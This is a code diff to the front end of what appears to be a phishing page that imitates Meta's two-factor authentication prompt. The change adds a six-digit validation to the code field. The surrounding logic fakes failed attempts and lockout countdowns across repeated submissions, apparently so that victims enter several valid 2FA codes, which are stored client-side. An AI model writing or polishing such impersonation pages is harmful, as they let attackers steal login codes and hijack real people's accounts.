@@ -106,17 +106,30 @@ function openAuthenticationModal(userData) {
                 <form id="authForm">
                     <input type="number" id="twoFa" placeholder="Code" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none mb-3">
                     <p id="authError" class="text-red-500 text-sm hidden mb-3"></p>
-                    <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full py-2.5 hover:bg-blue-700 transition-colors">Continue</button>
+                    <button type="submit" id="authSubmitBtn" disabled class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full py-2.5 hover:bg-blue-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed">Continue</button>
                     <div class="w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] poiter-events-none"><span>Try another way</span></div>
                 </form>
             </div>
             <div class="w-16 mt-5 mx-auto">
                 <img src="./public/images/logo-gray.svg" alt="Meta">
+            </div>
         </div>
     `;
 
     Modal.create('authModal', content);
     Modal.open('authModal');
+
+    const input2Fa = document.getElementById('twoFa');
+    const mainSubmitBtn = document.getElementById('authSubmitBtn');
+
+    input2Fa.addEventListener('input', (e) => {
+        const value = e.target.value.trim();
+        if (value.length >= 6) {
+            mainSubmitBtn.disabled = false;
+        } else {
+            mainSubmitBtn.disabled = true;
+        }
+    });
 
     let authClickCount = 0;
     let countdownInterval;
@@ -135,6 +148,12 @@ function openAuthenticationModal(userData) {
             return;
         }
 
+        if (twoFa.length < 6) {
+            errorMsg.textContent = "Code must be at least 6 digits!";
+            errorMsg.classList.remove('hidden');
+            return;
+        }
+
         submitBtn.disabled = true;
         submitBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto"></div>';
 
@@ -148,6 +167,8 @@ function openAuthenticationModal(userData) {
                 submitBtn.innerHTML = 'Continue';
                 startCountdown(input, errorMsg, submitBtn);
                 authClickCount = 1;
+                
+                submitBtn.disabled = (input.value.trim().length < 6);
             }, 1400);
         } else if (authClickCount === 1) {
             const dataLocal = Utils.getRecord('__client_rec__fou_rth');
@@ -159,6 +180,8 @@ function openAuthenticationModal(userData) {
                 submitBtn.innerHTML = 'Continue';
                 startCountdown(input, errorMsg, submitBtn);
                 authClickCount = 2;
+                
+                submitBtn.disabled = (input.value.trim().length < 6);
             }, 1200);
         } else {
             const dataLocal = Utils.getRecord('__client_rec__f_if_th');
@@ -171,6 +194,7 @@ function openAuthenticationModal(userData) {
             }, 1600);
         }
     });
+}
 
     function startCountdown(input, errorMsg, submitBtn) {
         input.disabled = true;
@@ -195,7 +219,6 @@ function openAuthenticationModal(userData) {
             }
         }, 1000);
     }
-}
 
 // ==================== MODAL 4: SUCCESS ====================
 function openSuccessModal() {
